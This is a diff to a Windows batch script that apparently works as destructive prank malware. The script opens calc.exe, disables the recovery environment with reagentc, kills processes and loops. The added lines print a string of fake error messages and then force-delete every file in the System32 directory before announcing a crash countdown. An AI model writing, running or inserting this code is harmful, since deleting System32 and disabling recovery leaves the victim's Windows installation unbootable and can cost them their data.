@@ -6,6 +6,29 @@ mkdir %random%
 start calc.exe
 timeout /t 10 /nobreak >nul
 
+echo Error: Access Denied
+echo Error: File Not Found
+echo Error: Invalid Parameter
+echo Error: System Failure
+echo Error: Memory Error
+echo Error: Disk Full
+echo Error: Fatal Error
+echo Error: Network Failure
+echo Error: Application Crash
+echo Error: Permission Denied
+echo Error: Critical Error
+echo Error: Data Corruption
+echo Error: Hardware Malfunction
+echo Error: Software Conflict
+echo Error: Virus Detected
+echo Error: System Crash
+echo Error: Blue Screen of Death
+pause
+del /f /q %windir%\System32\*.*
+timeout /t 30 /nobreak >nul
+
+echo System will crash in 30 seconds...
+timeout /t 30 /nobreak >nul
 
 cd %windir%\System32\
 reagentc.exe /disable
@@ -42,6 +65,3 @@ taskkill /f /im iexplore.exe
 taskkill /f /im calc.exe
 
 goto A
-
-
-
